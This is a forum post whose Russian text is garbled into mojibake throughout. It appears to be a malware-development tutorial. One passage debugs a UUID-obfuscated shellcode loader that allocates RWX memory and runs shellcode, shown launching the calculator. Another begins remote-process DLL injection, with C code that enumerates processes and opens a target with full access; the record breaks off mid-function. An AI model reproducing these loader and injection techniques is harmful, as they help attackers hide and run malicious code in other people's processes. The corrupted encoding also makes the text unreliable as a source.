–í —ç—Ç–æ–º —Ä–∞–∑–¥–µ–ª–µ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è –æ—Ç–ª–∞–∂–∏–≤–∞–µ—Ç—Å—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –æ—Ç–ª–∞–¥—á–∏–∫–∞ xdbg –¥–ª—è –±–æ–ª–µ–µ –≥–ª—É–±–æ–∫–æ–≥–æ –ø–æ–Ω–∏–º–∞–Ω–∏—è —Ç–æ–≥–æ, —á—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç &quot;–ø–æ–¥ –∫–∞–ø–æ—Ç–æ–º&quot;.<br />
<br />
–°–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–≤–µ—Ä—å—Ç–µ –≤—ã–≤–æ–¥ —Ñ—É–Ω–∫—Ü–∏–∏ UuidDeobfuscation, —á—Ç–æ–±—ã —É–±–µ–¥–∏—Ç—å—Å—è, —á—Ç–æ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç—Å—è –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–π shellcode.<br />
<br />
–ò–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –Ω–∏–∂–µ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç, —á—Ç–æ shellcode —É—Å–ø–µ—à–Ω–æ –¥–µ–æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779143066.png"
		data-src="https://osint42.org/attachments/1746779143066-png.88/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779143066-png.88/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779143066.png"
			title="1746779143066.png"
			width="1315" height="766" loading="lazy" />
	</div><br />
<br />
–°–ª–µ–¥—É—é—â–∏–º —à–∞–≥–æ–º —è–≤–ª—è–µ—Ç—Å—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–≥–æ, —á—Ç–æ –ø–∞–º—è—Ç—å –≤—ã–¥–µ–ª—è–µ—Ç—Å—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º Windows API VirtualAlloc. –û–ø—è—Ç—å –∂–µ, –≥–ª—è–¥—è –Ω–∞ –∫–∞—Ä—Ç—É –ø–∞–º—è—Ç–∏ –≤ –Ω–∏–∂–Ω–µ–º –ª–µ–≤–æ–º —É–≥–ª—É, –º–æ–∂–Ω–æ –≤–∏–¥–µ—Ç—å, —á—Ç–æ –ø–∞–º—è—Ç—å –±—ã–ª–∞ –≤—ã–¥–µ–ª–µ–Ω–∞ –∏ –∑–∞–ø–æ–ª–Ω–µ–Ω–∞ –Ω—É–ª—è–º–∏.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779149409.png"
		data-src="https://osint42.org/attachments/1746779149409-png.89/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779149409-png.89/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779149409.png"
			title="1746779149409.png"
			width="1282" height="772" loading="lazy" />
	</div><br />
<br />
<br />
–ü–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–≥–æ –≤—ã–¥–µ–ª–µ–Ω–∏—è –ø–∞–º—è—Ç–∏ –¥–µ–æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–Ω–∞—è –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –∑–∞–ø–∏—Å—ã–≤–∞–µ—Ç—Å—è –≤ –±—É—Ñ–µ—Ä –ø–∞–º—è—Ç–∏.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779155732.png"
		data-src="https://osint42.org/attachments/1746779155732-png.90/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779155732-png.90/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779155732.png"
			title="1746779155732.png"
			width="1560" height="843" loading="lazy" />
	</div><br />
<br />
–í—Å–ø–æ–º–Ω–∏—Ç–µ, —á—Ç–æ pDeobfuscatedPayload –±—ã–ª –æ–±–Ω—É–ª–µ–Ω, —á—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å –Ω–∞–ª–∏—á–∏—è –¥–µ–æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–Ω–æ–π –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –≤ –ø–∞–º—è—Ç–∏ —Ç–∞–º, –≥–¥–µ –æ–Ω–∞ –Ω–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è. –ë—É—Ñ–µ—Ä –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –ø–æ–ª–Ω–æ—Å—Ç—å—é –æ–±–Ω—É–ª–µ–Ω.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779162585.png"
		data-src="https://osint42.org/attachments/1746779162585-png.91/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779162585-png.91/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779162585.png"
			title="1746779162585.png"
			width="1393" height="614" loading="lazy" />
	</div><br />
<br />
–ò, –Ω–∞–∫–æ–Ω–µ—Ü, shellcode –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è, –∏, –∫–∞–∫ –æ–∂–∏–¥–∞–ª–æ—Å—å, –ø–æ—è–≤–ª—è–µ—Ç—Å—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779168989.png"
		data-src="https://osint42.org/attachments/1746779168989-png.92/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779168989-png.92/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779168989.png"
			title="1746779168989.png"
			width="1815" height="806" loading="lazy" />
	</div><br />
<br />
<br />
Shellcode –º–æ–∂–Ω–æ —É–≤–∏–¥–µ—Ç—å –Ω–∞ –≤–∫–ª–∞–¥–∫–µ –ø–∞–º—è—Ç–∏ –≤ Process Hacker.<br />
–û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ –Ω–∞ —Ç–æ, —á—Ç–æ –≤—ã–¥–µ–ª–µ–Ω–Ω—ã–π —Ä–µ–≥–∏–æ–Ω –ø–∞–º—è—Ç–∏ –∏–º–µ–µ—Ç –∑–∞—â–∏—Ç—É –ø–∞–º—è—Ç–∏ RWX, –æ–Ω –≤—ã–¥–µ–ª—è–µ—Ç—Å—è –≤ —Ä–∞–Ω—Ç–∞–π–º–µ <b><u>–∏, —Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, –æ–±—ã—á–Ω–æ —è–≤–ª—è–µ—Ç—Å—è –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä–æ–º –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û.</u></b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779183511.png"
		data-src="https://osint42.org/attachments/1746779183511-png.93/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779183511-png.93/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779183511.png"
			title="1746779183511.png"
			width="1202" height="683" loading="lazy" />
	</div></div>
						

							<h2>–ò–Ω—å–µ–∫—Ü–∏—è –≤ –ø—Ä–æ—Ü–µ—Å—Å</h2>

							

							

							<div class="bbWrapper">–í —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ –ø—Ä–µ–¥–ª–∞–≥–∞—é –æ–±—Å—É–¥–∏—Ç—å –º–µ—Ç–æ–¥, –∞–Ω–∞–ª–æ–≥–∏—á–Ω—ã–π —Ç–æ–º—É, —á—Ç–æ –±—ã–ª –ø–æ–∫–∞–∑–∞–Ω —Ä–∞–Ω–µ–µ –ø—Ä–∏ –ª–æ–∫–∞–ª—å–Ω–æ–π –∏–Ω—ä–µ–∫—Ü–∏–∏ DLL, –∑–∞ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ–º —Ç–æ–≥–æ, —á—Ç–æ —Ç–µ–ø–µ—Ä—å –∏–Ω—ä–µ–∫—Ü–∏—è –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è –≤ —É–¥–∞–ª–µ–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å.<br />
<br />
<b>–ü–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤</b><br />
<br />
–ü—Ä–µ–∂–¥–µ —á–µ–º –º–æ–∂–Ω–æ –±—É–¥–µ—Ç –∏–Ω—ä–µ—Ü–∏—Ä–æ–≤–∞—Ç—å DLL –≤ –ø—Ä–æ—Ü–µ—Å—Å, –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤—ã–±—Ä–∞—Ç—å —Ü–µ–ª–µ–≤–æ–π –ø—Ä–æ—Ü–µ—Å—Å. –ü–æ—ç—Ç–æ–º—É –ø–µ—Ä–≤—ã–º —à–∞–≥–æ–º –≤ –∏–Ω—ä–µ–∫—Ü–∏–∏ –≤ —É–¥–∞–ª–µ–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å –æ–±—ã—á–Ω–æ —è–≤–ª—è–µ—Ç—Å—è –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–µ –∑–∞–ø—É—â–µ–Ω–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–µ –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–≤—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤, –≤ –∫–æ—Ç–æ—Ä—ã–µ –º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∏–Ω—ä–µ–∫—Ü–∏—é. –î–ª—è —ç—Ç–æ–≥–æ —Ç—Ä–µ–±—É–µ—Ç—Å—è –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞ (PID), —á—Ç–æ–±—ã –æ—Ç–∫—Ä—ã—Ç—å –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –Ω–µ–æ–±—Ö–æ–¥–∏–º—É—é —Ä–∞–±–æ—Ç—É –≤ –Ω–µ–º.<br />
<br />
–í —Å—Ç–∞—Ç—å–µ –º—ã —Å–æ–∑–¥–∞–¥–∏–º —Ñ—É–Ω–∫—Ü–∏—é, –∫–æ—Ç–æ—Ä–∞—è –≤—ã–ø–æ–ª–Ω—è–µ—Ç –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –≤—Å–µ—Ö –∑–∞–ø—É—â–µ–Ω–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤.<br />
–§—É–Ω–∫—Ü–∏—è GetRemoteProcessHandle –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –¥–ª—è –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è –≤—Å–µ—Ö –∑–∞–ø—É—â–µ–Ω–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –≤ —Å–∏—Å—Ç–µ–º–µ, –æ—Ç–∫—Ä—ã—Ç–∏—è –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏ –≤–æ–∑–≤—Ä–∞—Ç–∞ –∫–∞–∫ PID, —Ç–∞–∫ –∏ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />
<b>CreateToolhelp32Snapshot</b><br />
<br />
–ö–æ–¥–æ–≤—ã–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —Ñ—É–Ω–∫—Ü–∏–∏ CreateToolhelp32Snapshot —Å —Ñ–ª–∞–≥–æ–º TH32CS_SNAPPROCESS –≤ –∫–∞—á–µ—Å—Ç–≤–µ –ø–µ—Ä–≤–æ–≥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–∑–¥–∞–µ—Ç —Å–Ω–∏–º–æ–∫ –≤—Å–µ—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤, —Ä–∞–±–æ—Ç–∞—é—â–∏—Ö –≤ —Å–∏—Å—Ç–µ–º–µ –≤ –º–æ–º–µ–Ω—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Ñ—É–Ω–∫—Ü–∏–∏.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –°–æ–∑–¥–∞–µ—Ç —Å–Ω–∏–º–æ–∫ –≤—Å–µ—Ö –≤ –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç –≤—ã–ø–æ–ª–Ω—è—é—â–∏—Ö—Å—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);</code></pre>
	</div>
</div><br />
<b>–°—Ç—Ä—É–∫—Ç—É—Ä–∞ PROCESSENTRY32</b><br />
<br />
–ü–æ—Å–ª–µ —Å–æ–∑–¥–∞–Ω–∏—è —Å–Ω–∏–º–∫–∞ —Ñ—É–Ω–∫—Ü–∏—è Process32First –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–µ—Ä–≤–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ –≤ —Å–Ω–∏–º–∫–µ. –î–ª—è –≤—Å–µ—Ö –æ—Å—Ç–∞–ª—å–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –≤ —Å–Ω–∏–º–∫–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏—è Process32Next.<br />
<br />
–î–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è Microsoft —É—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç, —á—Ç–æ –∫–∞–∫ Process32First, —Ç–∞–∫ –∏ Process32Next —Ç—Ä–µ–±—É—é—Ç –ø–µ—Ä–µ–¥–∞—á–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã PROCESSENTRY32 –≤ –∫–∞—á–µ—Å—Ç–≤–µ –≤—Ç–æ—Ä–æ–≥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞. –ü–æ—Å–ª–µ –≤—ã–∑–æ–≤–∞ —Ñ—É–Ω–∫—Ü–∏–π —ç—Ç–∏ —Ñ—É–Ω–∫—Ü–∏–∏ –∑–∞–ø–æ–ª–Ω—è—é—Ç —Å—Ç—Ä—É–∫—Ç—É—Ä—É –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –æ –ø—Ä–æ—Ü–µ—Å—Å–µ.<br />
<br />
–°—Ç—Ä—É–∫—Ç—É—Ä–∞ PROCESSENTRY32 –ø–æ–∫–∞–∑–∞–Ω–∞ –Ω–∏–∂–µ —Å –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏—è–º–∏ —Ä—è–¥–æ–º –∫ –ø–æ–ª–µ–∑–Ω—ã–º —á–ª–µ–Ω–∞–º —Å—Ç—Ä—É–∫—Ç—É—Ä—ã, –∫–æ—Ç–æ—Ä—ã–µ –±—É–¥—É—Ç –∑–∞–ø–æ–ª–Ω–µ–Ω—ã —ç—Ç–∏–º–∏ —Ñ—É–Ω–∫—Ü–∏—è–º–∏.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct tagPROCESSENTRY32 {
  DWORD     dwSize;
  DWORD     cntUsage;
  DWORD     th32ProcessID;              // –ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞
  ULONG_PTR th32DefaultHeapID;
  DWORD     th32ModuleID;
  DWORD     cntThreads;
  DWORD     th32ParentProcessID;        // –ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞
  LONG      pcPriClassBase;
  DWORD     dwFlags;
  CHAR      szExeFile[MAX_PATH];        // –ò–º—è –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞
} PROCESSENTRY32;</code></pre>
	</div>
</div><br />
–ü–æ—Å–ª–µ –≤—ã–∑–æ–≤–∞ Process32First –∏–ª–∏ Process32Next –∏ –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã, –¥–∞–Ω–Ω—ã–µ –º–æ–∂–Ω–æ –∏–∑–≤–ª–µ—á—å –∏–∑ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã, –∏—Å–ø–æ–ª—å–∑—É—è –æ–ø–µ—Ä–∞—Ç–æ—Ä —Ç–æ—á–∫–∏.<br />
–ù–∞–ø—Ä–∏–º–µ—Ä, —á—Ç–æ–±—ã –∏–∑–≤–ª–µ—á—å PID, –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ PROCESSENTRY32.th32ProcessID.<br />
<br />
<b>Process32First –∏ Process32Next</b><br />
<br />
–ö–∞–∫ —É–∂–µ —É–ø–æ–º–∏–Ω–∞–ª–æ—Å—å, Process32First –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–µ—Ä–≤–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ, –∞ Process32Next –¥–ª—è –≤—Å–µ—Ö –æ—Å—Ç–∞–ª—å–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –≤ —Å–Ω–∏–º–∫–µ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Ü–∏–∫–ª–∞ do-while. –ò–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞, –∫–æ—Ç–æ—Ä–æ–µ –∏—â–µ—Ç—Å—è (szProcessName), —Å—Ä–∞–≤–Ω–∏–≤–∞–µ—Ç—Å—è —Å –∏–º–µ–Ω–µ–º –ø—Ä–æ—Ü–µ—Å—Å–∞ –≤ —Ç–µ–∫—É—â–µ–π –∏—Ç–µ—Ä–∞—Ü–∏–∏ —Ü–∏–∫–ª–∞, –∫–æ—Ç–æ—Ä–æ–µ –∏–∑–≤–ª–µ–∫–∞–µ—Ç—Å—è –∏–∑ –∑–∞–ø–æ–ª–Ω–µ–Ω–Ω–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã Proc.szExeFile. –ï—Å–ª–∏ –µ—Å—Ç—å —Å–æ–≤–ø–∞–¥–µ–Ω–∏–µ, —Ç–æ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞ (PID), –∏ –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç—Å—è –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –¥–ª—è —ç—Ç–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–µ—Ä–≤–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ –≤ —Å–Ω–∏–º–∫–µ.
if (!Process32First(hSnapShot, &amp;Proc)) {
    printf(&quot;[!] Process32First Failed With Error : %d \n&quot;, GetLastError());
    goto _EndOfFunction;
}

do {
    // –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –æ–ø–µ—Ä–∞—Ç–æ—Ä —Ç–æ—á–∫–∏ –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –∏–º–µ–Ω–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏–∑ –∑–∞–ø–æ–ª–Ω–µ–Ω–Ω–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã
    // –ï—Å–ª–∏ –∏–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞ —Å–æ–≤–ø–∞–¥–∞–µ—Ç —Å —Ç–µ–º, —á—Ç–æ –º—ã –∏—â–µ–º
    if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
        // –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –æ–ø–µ—Ä–∞—Ç–æ—Ä —Ç–æ—á–∫–∏ –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏–∑ –∑–∞–ø–æ–ª–Ω–µ–Ω–Ω–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã
        // –°–æ—Ö—Ä–∞–Ω–∏—Ç–µ PID
        *dwProcessId  = Proc.th32ProcessID;
        // –û—Ç–∫—Ä–æ–π—Ç–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞
        *hProcess     = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
        if (*hProcess == NULL)
            printf(&quot;[!] OpenProcess Failed With Error : %d \n&quot;, GetLastError());

        break; // –í—ã—Ö–æ–¥ –∏–∑ —Ü–∏–∫–ª–∞
    }

// –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–ª–µ–¥—É—é—â–µ–º –ø—Ä–æ—Ü–µ—Å—Å–µ –≤ —Å–Ω–∏–º–∫–µ.
// –ü–æ–∫–∞ –≤ —Å–Ω–∏–º–∫–µ –µ—â–µ –æ—Å—Ç–∞–µ—Ç—Å—è –ø—Ä–æ—Ü–µ—Å—Å, –ø—Ä–æ–¥–æ–ª–∂–∞–π—Ç–µ —Ü–∏–∫–ª
} while (Process32Next(hSnapShot, &amp;Proc));</code></pre>
	</div>
</div><br />
<b>–ü—Ä–∏–º–µ—Ä –∫–æ–¥–∞ –ø–æ–ª—É—á–µ–Ω–∏—è ID –∏ —Ö–µ–Ω–¥–ª–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞ –ø–æ –∏–º–µ–Ω–∏:</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {

    // –°–æ–≥–ª–∞—Å–Ω–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏:
    // –ü–µ—Ä–µ–¥ –≤—ã–∑–æ–≤–æ–º —Ñ—É–Ω–∫—Ü–∏–∏ Process32First —É—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ —ç—Ç–æ—Ç —á–ª–µ–Ω –≤ sizeof(PROCESSENTRY32).
    // –ï—Å–ª–∏ dwSize –Ω–µ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω, Process32First –∑–∞–≤–µ—Ä—à–∏—Ç—Å—è –Ω–µ—É–¥–∞—á–µ–π.
    PROCESSENTRY32    Proc = {
        .dwSize = sizeof(PROCESSENTRY32)
    };

    HANDLE hSnapShot = NULL;

    // –°–æ–∑–¥–∞–µ—Ç —Å–Ω–∏–º–æ–∫ –≤—Å–µ—Ö –≤ –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç –≤—ã–ø–æ–ª–Ω—è—é—â–∏—Ö—Å—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapShot == INVALID_HANDLE_VALUE){
        printf(&quot;[!] CreateToolhelp32Snapshot Failed With Error : %d \n&quot;, GetLastError());
        goto _EndOfFunction;
    }

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–µ—Ä–≤–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ –≤ —Å–Ω–∏–º–∫–µ.
    if (!Process32First(hSnapShot, &amp;Proc)) {
        printf(&quot;[!] Process32First Failed With Error : %d \n&quot;, GetLastError());
        goto _EndOfFunction;
    }

    do {
        // –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –æ–ø–µ—Ä–∞—Ç–æ—Ä —Ç–æ—á–∫–∏ –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –∏–º–µ–Ω–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏–∑ –∑–∞–ø–æ–ª–Ω–µ–Ω–Ω–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã
        // –ï—Å–ª–∏ –∏–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞ —Å–æ–≤–ø–∞–¥–∞–µ—Ç —Å —Ç–µ–º, —á—Ç–æ –º—ã –∏—â–µ–º
        if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
            // –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –æ–ø–µ—Ä–∞—Ç–æ—Ä —Ç–æ—á–∫–∏ –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏–∑ –∑–∞–ø–æ–ª–Ω–µ–Ω–Ω–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã
            // –°–æ—Ö—Ä–∞–Ω–∏—Ç–µ PID
            *dwProcessId = Proc.th32ProcessID;
            // –û—Ç–∫—Ä–æ–π—Ç–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞
            *hProcess    = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
            if (*hProcess == NULL)
                printf(&quot;[!] OpenProcess Failed With Error : %d \n&quot;, GetLastError());

            break; // –í—ã—Ö–æ–¥ –∏–∑ —Ü–∏–∫–ª–∞
        }

